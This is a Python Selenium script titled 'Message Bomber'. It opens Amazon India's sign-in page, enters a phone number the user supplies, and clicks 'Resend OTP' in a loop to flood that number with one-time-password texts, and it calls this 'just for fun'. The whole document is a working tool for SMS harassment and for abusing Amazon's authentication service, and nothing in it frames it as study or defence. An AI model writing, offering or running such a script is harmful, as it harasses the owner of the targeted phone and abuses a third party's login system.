
''''-----Message Bomber-----
Here is the code that  accept a contact number to send multiple messages of Otp by amazon just for fun!!!!
Requirement: The person must have a amazon account 
Steps to be followed:
1)Open the google
2)Go to amazon's website
3)Click on sign in
4)Take the phone number
5)Enter the phone number
6)Click on continue
7)Click on get an otp on your phone once
8)Click on resend otp over and over again
9)close the browser ''''







#importing the required libraries
from selenium import webdriver
#step 1
browser=webdriver.Chrome("C:\\Users\\ASUS\\Desktop\\chromedriver.exe")

#step2
#We dont want to go for homepage so directly lets open sign in page
#step 3
browser.get("https://www.amazon.in/ap/signin?_encoding=UTF8&ignoreAuthState=1&openid.assoc_handle=inflex&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.in%2F%3Fref_%3Dnav_custrec_signin&switch_account=")
#step 4
phone_number=input("Enter your phonenumber:")
time=input("Enter how many times you need to send a message:")
phone=browser.find_element_by_id("ap_email") 
#step 5
phone.send_keys(phone_number)
#step 6
cnt=browser.find_element_by_id("continue")
cnt.click()
#step 7
getOTP=browser.find_element_by_id("continue")
getOTP.click()
#step 8
#click on resend button
time=int(time)
n=time-1
for i in range(n):
	r=browser.find_element_by_link_text("Resend OTP")
	r.click()
#step 9
#close the browser
browser.quit()
